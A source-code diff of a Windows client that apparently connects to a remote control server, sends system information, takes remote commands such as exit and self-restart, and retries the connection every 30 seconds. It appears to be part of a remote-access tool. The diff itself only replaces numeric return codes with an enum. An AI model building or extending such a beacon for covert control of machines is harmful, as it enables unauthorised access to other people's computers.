@@ -108,7 +108,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	{
 		MsgErr("Can't Connect");
 
-		return 0;//connect error
+		return (DWORD)WORKING_STATE::CONNECT_ERR;
 	}
 
 	SysInfo m_SysInfo;
@@ -126,10 +126,10 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	{
 		MsgErr("Can't Send");
 		closesocket(MainSocket);
-		return 1; //send socket type error
+		return (DWORD)WORKING_STATE::REQUEST_ERR;
 	}
 
-	CHAR chBuffer[4096];
+	char chBuffer[4096];
 
 	while (true)
 	{
@@ -139,7 +139,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			shutdown(MainSocket, 0x02);
 			closesocket(MainSocket);
 
-			return 1;
+			return (DWORD)WORKING_STATE::RECEIVE_ERR;
 		}
 
 		switch (msgHead.dwCmd)
@@ -184,7 +184,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		{
 			shutdown(MainSocket, 0x02);
 			closesocket(MainSocket);
-			return STATE_EXIT;
+			return (DWORD)WORKING_STATE::ON_EXIT;
 		}
 
 		case CMD_RESTART:
@@ -197,7 +197,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			GetModuleFileNameA(GetModuleHandle(NULL), SelfPath, 128);
 			WinExec(SelfPath, 0);
 
-			return STATE_EXIT;
+			return (DWORD)WORKING_STATE::ON_EXIT;
 		}
 
 #ifdef LxPower
@@ -883,7 +883,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		//lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
 	}
 
-	DWORD state = 1;
+	DWORD state = (DWORD)WORKING_STATE::CONNECT_ERR;
 
 	while (true)
 	{
@@ -893,21 +893,25 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		}
 		__except (1)
 		{
-			MsgErr("RoutineMain");
+			MsgErr("RoutineMain %d", state);
 		}
 
-		if (state == 0) //Connect Error
+		if (state == (DWORD)WORKING_STATE::CONNECT_ERR)
 		{
 			Sleep(30 * 1000);
 		}
-		else if (state == 1) //Network Error
+		else if (state == (DWORD)WORKING_STATE::REQUEST_ERR)
 		{
 			Sleep(30 * 1000);
 		}
-		else if (state == STATE_EXIT) //Exit
+		else if (state == (DWORD)WORKING_STATE::RECEIVE_ERR)
+		{
+			Sleep(30 * 1000);
+		}
+		else if (state == (DWORD)WORKING_STATE::ON_EXIT)
 		{
 			Dbp("Exit Request");
-			return STATE_EXIT;
+			return (DWORD)WORKING_STATE::ON_EXIT;
 		}
 
 		Sleep(1000);
